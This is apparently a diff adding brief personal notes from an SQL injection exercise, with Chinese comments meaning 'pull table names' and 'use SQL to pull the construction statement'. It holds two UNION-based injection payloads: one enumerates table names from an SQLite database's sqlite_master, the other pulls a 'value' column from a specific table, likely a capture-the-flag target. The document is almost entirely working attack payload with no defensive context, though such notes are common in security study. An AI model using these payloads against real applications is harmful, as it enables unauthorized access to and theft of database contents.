@@ -1,0 +1,4 @@
+1 and 1=2 union select 1,name from sqlite_master where type='table' limit 0,1;
+拉表名
+用sql拉构造语句
+1 and 1=2 union select 1,`value` from xnkuai1e limit 9,1;
